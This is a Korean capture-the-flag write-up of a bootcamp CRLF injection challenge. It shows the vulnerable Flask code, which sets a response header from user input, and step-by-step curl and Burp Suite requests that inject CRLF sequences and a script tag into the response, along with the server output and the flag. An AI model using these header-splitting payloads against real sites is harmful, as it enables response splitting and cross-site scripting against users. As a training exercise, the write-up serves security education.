---
title: "[Writeup] Knockon Bootcamp - 11. CRLF injection"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Carriage Return Line Feed
  - CRLF Injection
last_modified_at: 2024-09-15T21:30:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10013/>

![11. CRLF injection 1](/assets/images/writeup/web-hacking/knock-on/11_CRLF_1.png)

![11. CRLF injection 2](/assets/images/writeup/web-hacking/knock-on/11_CRLF_2.png)

|

|

|

### 목표

---

CRLF Injection 실습. flag 얻기

|

### 공격 기법

---

CRLF Injection

|

|

|

## 문제 코드

```python
from flask import Flask, request, make_response, render_template
from urllib import parse
import os
import sys
from bs4 import BeautifulSoup

secret_flag = os.getenv('FLAG')

app = Flask(__name__)

import requests

def check_for_alert_function_in_url(url,data):
    response = requests.post(url,data=data)
    if response.status_code == 200:
        html_content = response.text
        soup = BeautifulSoup(html_content, 'html.parser')
        script_tags = soup.find_all('script')
        for script_tag in script_tags:
            script_content = script_tag.string
            if script_content and 'alert(' in script_content:
                return True
        return False
    else:
        print("err",sys.stderr)
        return False
    

@app.route('/report', methods=['GET','POST'])
def report():
    if request.method == "POST":

        header = request.form["header"]
        user_input = request.form["value"]

        if check_for_alert_function_in_url("http://localhost",{"header":header,"value":user_input}):
            response = make_response(f'{secret_flag}')
            return response
        return make_response(f'Nice try!')

    return render_template("index.html")

@app.route('/', methods=['GET','POST'])
def index():
    if request.method == "POST":

        header = request.form["header"]
        user_input = request.form["value"]

        response = make_response(f'I\'t is very good day to walk out. Power thourgh!!!!')

        response.headers.set(header, user_input)

        return response

    return render_template("index.html")

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80)
```

|

|

|

## 코드 분석

### check_for_alert_function_in_url()

---

```python
def check_for_alert_function_in_url(url,data):
    response = requests.post(url,data=data)
    if response.status_code == 200:
        html_content = response.text # 1
        soup = BeautifulSoup(html_content, 'html.parser') # 2
        script_tags = soup.find_all('script')
        for script_tag in script_tags:
            script_content = script_tag.string
            if script_content and 'alert(' in script_content:
                return True
        return False
    else:
        print("err",sys.stderr)
        return False
```

```python
def check_for_alert_function_in_url(url,data):
    response = requests.post(url,data=data)
```

`url`, `data`를 받아서 POST 요청을 보냄

|

```python
if response.status_code == 200:
    html_content = response.text # 1
    soup = BeautifulSoup(html_content, 'html.parser') # 2
    script_tags = soup.find_all('script')
    for script_tag in script_tags:
        script_content = script_tag.string
        if script_content and 'alert(' in script_content: # 3
            return True
    return False
```

200 OK 일 때, 

1. `response.text`(응답 본문의 텍스트 내용)을  `html_content` 에 저장
2. `html.parser`를 이용해 `html_content`를 파싱하여 `<script>`태그를 찾아 `script_tags`에 저장
3. `<script>`태그에 `alert(`가 포함되어있는지 확인 후 있으면 `True`, 없으면 `False` 반환 

|

|

### index()

---

```python
def index():
    if request.method == "POST":

        header = request.form["header"]
        user_input = request.form["value"]

        response = make_response(f'I\'t is very good day to walk out. Power thourgh!!!!')

        response.headers.set(header, user_input)

        return response

    return render_template("index.html")
```

```python
if request.method == "POST":
    header = request.form["header"]
    user_input = request.form["value"]
```

POST 요청이 들어오면 실행

폼 데이터에서 `header`, `value`를 가져와서 `header`, `user_input`에 각각 저장

|

```python
response = make_response(f'I\'t is very good day to walk out. Power thourgh!!!!')
response.headers.set(header, user_input)
return response
```

응답 메시지 생성 후 `response`에 저장

`response`의 헤더로 `header`, `user_input` 설정

`response`반환

|

|

### report()

---

```python
def report():
    if request.method == "POST":

        header = request.form["header"]
        user_input = request.form["value"]

        if check_for_alert_function_in_url("http://localhost",{"header":header,"value":user_input}):
            response = make_response(f'{secret_flag}')
            return response
        return make_response(f'Nice try!')

    return render_template("index.html")
```

```python
if request.method == "POST":
    header = request.form["header"]
    user_input = request.form["value"]
```

POST 요청이 들어오면 실행

폼 데이터에서 `header`, `value`를 가져와서 `header`, `user_input`에 각각 저장

|

```python
if check_for_alert_function_in_url("http://localhost",{"header":header,"value":user_input}):
    response = make_response(f'{secret_flag}')
    return response
return make_response(f'Nice try!')
```

`check_for_alert_function_in_url()`함수 호출. `http://localhost`와 헤더를 넘겨줌

`True`이면 `response`에 `secret_flag`저장 후 반환

|

|

|

## Exploit

`secret_flag`를 얻는 법

1. `/report`로 POST 요청을 보내면서, `header`와 `value` 폼 데이터를 넘기기
2. `value`에`<script>alert()</script>`를 포함시키고, 본문으로 인식시키기

|

```python
response.headers.set(header, user_input)
```

`/`에서 `header`와 `value` 폼 데이터에 `<script>alert()</script>`를 포함시킨 후 잘 포함되었는지 확인할 수 있음

잘 포함되었다면 `/report`로 같은 요청을 보내면 됨

|

|

## 방법 1 - curl

### curl -option

---

`-X`: `Request Command`. HTTP 메서드를 명시적으로 요청. GET, POST 등의 요청을 할 수 있음

`-d` or `--data`: 데이터 전송. 이 옵션을 사용하면 기본적으로 POST 요청으로 됨. `-X POST` 생략 가능

`-v` or `--verbose`: 요청과 응답의 세부 사항을 출력. 응답 헤더가 어떻게 설정되었는지 볼 수 있음

|

### 1-1. post 요청 - header, value

---

```bash
curl -v http://war.knock-on.org:10013/ -d "header=header1&value=value1"
```

```bash
* Host war.knock-on.org:10013 was resolved.
* IPv6: 64:ff9b::3b12:d88d
* IPv4: 59.18.216.141
*   Trying [64:ff9b::3b12:d88d]:10013...
* Connected to war.knock-on.org (64:ff9b::3b12:d88d) port 10013
> POST / HTTP/1.1
> Host: war.knock-on.org:10013
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Length: 27
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.3 Python/3.10.12
< Date: Mon, 16 Sep 2024 06:16:54 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 51
< header1: value1
< Connection: close
<
* Closing connection
I't is very good day to walk out. Power thourgh!!!!
```

`header`와 `value`폼 데이터를 포함시켜 `POST` 요청

|

|

### 1-2. 헤더 두 개 설정

---

```bash
curl -v http://war.knock-on.org:10013/ -d "header=header1: value1%0D%0Aheader2&value=value2"
```

```bash
* Host war.knock-on.org:10013 was resolved.
* IPv6: 64:ff9b::3b12:d88d
* IPv4: 59.18.216.141
*   Trying [64:ff9b::3b12:d88d]:10013...
* Connected to war.knock-on.org (64:ff9b::3b12:d88d) port 10013
> POST / HTTP/1.1
> Host: war.knock-on.org:10013
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Length: 48
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.3 Python/3.10.12
< Date: Sat, 14 Sep 2024 12:51:45 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 51
< header1: value1
< header2: value2
< Connection: close
<
* Closing connection
I't is very good day to walk out. Power thourgh!!!!
```

```bash
"header=header1: value1%0D%0Aheader2&value=value2"
```

`\r = %0D`: Carrage Return

`\n = %0A`: Line Feed

`CRLF Injection`으로 헤더를 두 개 설정

|

### 1-3. 헤더를 본문으로 인식

---

```bash
curl -v http://war.knock-on.org:10013/ -d "header=header1: value1%0D%0A%0D%0Aheader2&value=value2"
```

```bash
* Host war.knock-on.org:10013 was resolved.
* IPv6: 64:ff9b::3b12:d88d
* IPv4: 59.18.216.141
*   Trying [64:ff9b::3b12:d88d]:10013...
* Connected to war.knock-on.org (64:ff9b::3b12:d88d) port 10013
> POST / HTTP/1.1
> Host: war.knock-on.org:10013
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Length: 54
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.3 Python/3.10.12
< Date: Sat, 14 Sep 2024 12:50:00 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 51
< header1: value1
<
header2: value2
Connection: close

* Excess found writing body: excess = 38, size = 51, maxdownload = 51, bytecount = 51
* Closing connection
I't is very g
```

```bash
"header=header1: value1%0D%0A%0D%0Aheader2&value=value2"
```

첫 번째 헤더의 `value` 뒷부분에 `CRLF`를 두 개 추가하면 두 번째 헤더를 본문으로 인식시킬 수 있음

|

### 1-4. 본문에 내용 추가

---

```bash
curl -v http://war.knock-on.org:10013/ -d "header=header1: value1%0D%0A%0D%0A<script>alert(123)</script>header2&value=value2"

* Host war.knock-on.org:10013 was resolved.
* IPv6: 64:ff9b::3b12:d88d
* IPv4: 59.18.216.141
*   Trying [64:ff9b::3b12:d88d]:10013...
* Connected to war.knock-on.org (64:ff9b::3b12:d88d) port 10013
> POST / HTTP/1.1
> Host: war.knock-on.org:10013
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Length: 81
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.3 Python/3.10.12
< Date: Sat, 14 Sep 2024 13:00:42 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 51
< header1: value1
<
<script>alert(123)</script>header2: value2
* Excess found writing body: excess = 65, size = 51, maxdownload = 51, bytecount = 51
* Closing connection
Connect
```

```bash
"header=header1: value1%0D%0A%0D%0A<script>alert(123)</script>header2&value=value2"
```

CRLF를 두 번 추가한 부분부터는 본문으로 인식됨

이곳에 `<script>alert()</script>`삽입

|

### 1-5. /report에 요청

---

```bash
curl -v http://war.knock-on.org:10013/report -d "header=header1: value1%0D%0A%0D%0A<script>alert()</script>header2&value=value2"

* Host war.knock-on.org:10013 was resolved.
* IPv6: 64:ff9b::3b12:d88d
* IPv4: 59.18.216.141
*   Trying [64:ff9b::3b12:d88d]:10013...
* Connected to war.knock-on.org (64:ff9b::3b12:d88d) port 10013
> POST /report HTTP/1.1
> Host: war.knock-on.org:10013
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Length: 78
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.3 Python/3.10.12
< Date: Sat, 14 Sep 2024 12:58:28 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 37
< Connection: close
<
* Closing connection
K0{CRLF_is_very_common_vulnerability}
```

`/`경로에서 잘 되는 것을 확인했으니 그대로 `/report` 경로로 요청

|

|

|

### 방법 2 - burp suite

### 2-1. post 요청 - header, value

---

```sh
POST / HTTP/1.1
Host: war.knock-on.org:10013
Content-Type: application/x-www-form-urlencoded

header=header1&value=value1
```

```sh
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.10.12
Date: Mon, 16 Sep 2024 12:39:23 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 51
header1: value1
Connection: close

I't is very good day to walk out. Power thourgh!!!!
```

`POST` 요청으로 `header`와 `value` 설정

|

### 2-2. 헤더 두 개 설정

---

```sh
POST / HTTP/1.1
Host: war.knock-on.org:10013
Content-Type: application/x-www-form-urlencoded

header=header1: value1
header2&value=value2
```

```sh
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.10.12
Date: Mon, 16 Sep 2024 12:17:25 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 51
header1: value1
header2: value2
Connection: close

I't is very good day to walk out. Power thourgh!!!!
```

헤더 두 개 설정

|

### 2-3. 헤더를 본문으로 인식

---

```sh
POST / HTTP/1.1
Host: war.knock-on.org:10013
Content-Type: application/x-www-form-urlencoded

header=header1: value1

header2&value=value2
```

```sh
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.10.12
Date: Mon, 16 Sep 2024 12:18:48 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 51
header1: value1

header2: value2
Connection: close

I't is very good day to walk out. Power thourgh!!!!
```

`CRLF`를 추가하여 두 번째 헤더를 본문으로 인식시킴

|

### 2-4. 본문에 내용 추가

---

```sh
POST / HTTP/1.1
Host: war.knock-on.org:10013
Content-Type: application/x-www-form-urlencoded

header=header1: value1

<script>alert()</script>
header2&value=value2
```

```sh
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.10.12
Date: Mon, 16 Sep 2024 12:20:38 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 51
header1: value1

<script>alert()</script>
header2: value2
Connection: close

I't is very good day to walk out. Power thourgh!!!!
```

`\r\n\r\n` 과 두 번째 헤더 사이에 본문에 추가할 내용 추가

|

### 2-5. /report에 요청

----

```sh
POST /report HTTP/1.1
Host: war.knock-on.org:10013
Content-Type: application/x-www-form-urlencoded

header=header1: value1

<script>alert()</script>
header2&value=value2
```

```sh
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.10.12
Date: Mon, 16 Sep 2024 12:21:02 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 37
Connection: close

K0{CRLF_is_very_common_vulnerability}
```

그대로 경로만 `/report`로 바꿔줌

|

|

|

## Payload

### 1. curl

---

```bash
curl -v http://war.knock-on.org:10013/report -d "header=header:%0d%0a%0D%0A<script>alert(1)</script>&value"
```

|

### 2. burp suite

---

```bash
POST /report HTTP/1.1
Host: war.knock-on.org:10013
Content-Type: application/x-www-form-urlencoded

header=header1: value1

<script>alert()</script>
header2&value=value2
```

|

|

### FLAG

---

```bash
K0{CRLF_is_very_common_vulnerability}
```

|

---